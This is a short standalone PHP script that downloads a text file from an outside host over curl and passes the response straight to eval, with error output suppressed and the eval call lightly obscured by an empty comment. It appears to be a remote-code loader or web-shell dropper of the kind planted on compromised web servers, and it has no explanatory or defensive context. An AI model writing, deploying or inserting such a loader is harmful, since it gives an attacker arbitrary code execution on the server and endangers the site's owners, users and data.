<?php 
$url = "https://dy1s.hjhdy.com/dy/zzz.txt";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
@eval(/**/("?>".$result));
?>